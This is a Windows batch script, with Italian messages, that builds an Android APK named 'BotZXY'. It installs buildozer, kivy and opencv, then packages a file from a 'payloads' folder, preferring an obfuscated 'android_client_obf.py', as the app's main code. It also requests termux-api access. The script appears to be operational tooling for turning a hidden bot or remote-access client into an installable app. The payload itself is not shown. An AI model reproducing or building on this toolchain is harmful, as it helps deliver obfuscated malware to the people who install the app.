@echo off
title BotZXY - Android APK Builder (Windows)
color 0A

echo ========================================
echo   BotZXY - Android APK Builder
echo   Versione nativa per Windows
echo ========================================
echo.

REM 1. Verifica Python
echo [1/6] Verifica Python...
py -3.11 --version >nul 2>&1
if errorlevel 1 (
    echo [ERRORE] Python 3.11 non trovato!
    pause
    exit /b 1
)
echo [OK] Python 3.11 trovato

REM 2. Crea ambiente virtuale
echo.
echo [2/6] Creazione ambiente virtuale...
if exist "android_build_env" rmdir /s /q "android_build_env"
py -3.11 -m venv android_build_env
call android_build_env\Scripts\activate.bat
echo [OK] Ambiente virtuale creato

REM 3. Installa dipendenze
echo.
echo [3/6] Installazione dipendenze...
pip install buildozer cython kivy requests pillow opencv-python numpy
echo [OK] Dipendenze installate

REM 4. Crea struttura APK
echo.
echo [4/6] Preparazione APK...
set APK_DIR=apk_build_win

if exist "%APK_DIR%" rmdir /s /q "%APK_DIR%"
mkdir "%APK_DIR%"

REM Copia payload
if exist "payloads\android_client_obf.py" (
    copy "payloads\android_client_obf.py" "%APK_DIR%\main.py"
    echo [INFO] Usato payload offuscato
) else (
    copy "payloads\android_client.py" "%APK_DIR%\main.py"
    echo [INFO] Usato payload originale
)

REM Crea __init__.py
echo. > "%APK_DIR%\__init__.py"

REM 5. Crea buildozer.spec
echo.
echo [5/6] Configurazione buildozer...
cd "%APK_DIR%"

(
echo [app]
echo title = BotZXY
echo package.name = botzxy
echo package.domain = org.botzxy
echo source.dir = .
echo source.include_exts = py,png,jpg,kv,atlas,ttf
echo version = 2.0
echo requirements = python3,kivy,requests,opencv-python,termux-api,android
echo orientation = portrait
echo fullscreen = 0
echo.
echo [buildozer]
echo log_level = 2
echo warn_on_root = 1
) > buildozer.spec

REM 6. Compila APK
echo.
echo [6/6] Compilazione APK in corso...
echo ATTENZIONE: La compilazione richiede 10-20 minuti.
echo.

echo [BUILD] Inizializzazione...
buildozer init

echo.
echo [BUILD] Compilazione...
buildozer android debug

if errorlevel 1 (
    echo.
    echo [ERRORE] Compilazione fallita!
    cd ..
    pause
    exit /b 1
)

cd ..

if exist "%APK_DIR%\bin\*.apk" (
    echo.
    echo [OK] APK compilato con successo!
    if not exist "dist" mkdir dist
    
    for %%f in ("%APK_DIR%\bin\*.apk") do (
        copy "%%f" "dist\"
        echo [OK] APK salvato: dist\%%~nxf
    )
    
    for %%f in ("dist\*.apk") do (
        set /a SIZE=%%~zf/1048576
        echo [INFO] Dimensione: !SIZE! MB
    )
) else (
    echo.
    echo [ERRORE] APK non trovato!
    pause
    exit /b 1
)

REM Disattiva virtual environment
call deactivate

echo.
echo ========================================
echo   Build APK completato!
echo ========================================
echo File: dist\botzxy-*.apk
echo.

start explorer dist
pause